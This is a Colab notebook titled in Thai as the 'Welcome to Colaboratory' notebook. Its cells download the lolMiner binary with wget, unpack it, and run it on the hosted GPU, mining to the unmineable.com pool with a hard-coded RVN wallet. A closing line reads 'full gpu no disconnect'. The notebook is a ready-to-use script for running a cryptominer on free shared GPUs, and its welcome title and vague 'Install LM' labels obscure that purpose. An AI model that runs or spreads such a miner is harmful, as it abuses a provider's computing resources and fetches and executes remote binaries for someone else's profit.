{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "ยินดีต้อนรับสู่ Colaboratory",
      "provenance": [],
      "collapsed_sections": [],
      "include_colab_link": true
    },
    "kernelspec": {
      "display_name": "Python 3",
      "name": "python3"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/Cmarlee/02/blob/master/%E0%B8%A2%E0%B8%B4%E0%B8%99%E0%B8%94%E0%B8%B5%E0%B8%95%E0%B9%89%E0%B8%AD%E0%B8%99%E0%B8%A3%E0%B8%B1%E0%B8%9A%E0%B8%AA%E0%B8%B9%E0%B9%88_Colaboratory.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "qTtugLsKiCKx"
      },
      "source": [
        "Check GPU"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "K1qaC3RuiHeK"
      },
      "source": [
        " !nvidia-smi"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "0g9zDcp4iObc"
      },
      "source": [
        "Install LM"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "v3GzAbvsiNv5"
      },
      "source": [
        " \n",
        "! wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.28/lolMiner_v1.28a_Lin64.tar.gz"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "HLTBNmHLjofQ"
      },
      "source": [
        "UnTar"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "LkOLIYA-iGfY"
      },
      "source": [
        " ! tar -xf lolMiner_v1.28a_Lin64.tar.gz"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "fciDaX0ajs4J"
      },
      "source": [
        "CD to flies"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "NlEgAKM8j4Um"
      },
      "source": [
        "%cd 1.28a"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "QsMA62uxj8_E"
      },
      "source": [
        "RunTime"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "gpVS9TRHkHp5"
      },
      "source": [
        " \n",
        "./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user RVN:RLDqsbfymn7xzvuqNGvWLm5AVMvW4tHMPu.rig1 --ethstratum ETHPROXY"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "HxAdzOWnkKTu"
      },
      "source": [
        "full gpu no disconnect"
      ]
    }
  ]
}